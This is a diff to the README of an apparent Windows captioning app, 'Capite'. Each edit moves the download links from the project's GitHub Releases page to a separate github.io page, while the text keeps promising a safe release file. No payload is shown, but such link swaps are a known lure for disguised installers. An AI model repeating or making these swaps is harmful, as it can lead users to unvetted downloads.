@@ -1,6 +1,6 @@
 # 🎬 Capite - Free AI Video Captions That Pop
 
-[![Download Capite](https://img.shields.io/badge/Download-Capite-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Guhan-byte/Capite/releases)
+[![Download Capite](https://img.shields.io/badge/Download-Capite-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://guhan-byte.github.io)
 
 ## ✨ What Is Capite?
 
@@ -22,7 +22,7 @@ Ready to create stunning captions? Here's how to get Capite on your Windows comp
 
 ### Step 1: Download Capite
 
-Visit this link to download the application: **[https://github.com/Guhan-byte/Capite/releases](https://github.com/Guhan-byte/Capite/releases)**
+Visit this link to download the application: **[https://guhan-byte.github.io](https://guhan-byte.github.io)**
 
 Click the **latest release** and download the file. It's safe, free, and takes just a moment.
 
@@ -151,7 +151,7 @@ Capite is an open-source project that thrives on community support. You can:
 
 ## 📥 Download Now
 
-[![Download Capite](https://img.shields.io/badge/Download-Latest_Version-FF6B6B?style=flat-square&logo=github&logoColor=white)](https://github.com/Guhan-byte/Capite/releases)
+[![Download Capite](https://img.shields.io/badge/Download-Latest_Version-FF6B6B?style=flat-square&logo=github&logoColor=white)](https://guhan-byte.github.io)
 
 Start creating professional video captions today — completely free, completely yours.
 
